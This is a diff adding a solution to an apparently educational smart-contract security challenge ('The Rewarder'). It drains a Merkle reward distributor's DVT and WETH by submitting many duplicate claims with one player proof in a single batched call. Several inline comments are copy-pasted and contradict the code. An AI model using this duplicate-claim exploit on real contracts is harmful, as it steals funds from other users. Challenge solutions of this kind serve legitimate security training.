@@ -148,7 +148,49 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        uint256 playerDVTAmount = 11524763827831882;
+        uint256 playerWETHAmount = 1171088749244340;
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        {
+            bytes32[] memory proof = merkle.getProof(dvtLeaves, 188);
+            uint256 claimCount = dvt.balanceOf(address(distributor))/playerDVTAmount;
+            Claim[] memory claims = new Claim[](claimCount);
+            for(uint i; i < claimCount; i++){
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first WETH batch
+                    amount: playerDVTAmount,
+                    tokenIndex: 0, // claim corresponds to second token in `tokensToClaim` array
+                    proof: proof  // Alice's address is at index 2
+                });
+            }
+            distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+            dvt.transfer(recovery, dvt.balanceOf(player));
+        }
+
+        {
+            bytes32[] memory proof = merkle.getProof(wethLeaves, 188);
+            uint256 claimCount = weth.balanceOf(address(distributor))/playerWETHAmount;
+            Claim[] memory claims = new Claim[](claimCount);
+            for(uint i; i < claimCount; i++){
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first WETH batch
+                    amount: playerWETHAmount,
+                    tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                    proof: proof  // Alice's address is at index 2
+                });
+            }
+            distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+            weth.transfer(recovery, weth.balanceOf(player));
+        }
+
     }
 
     /**
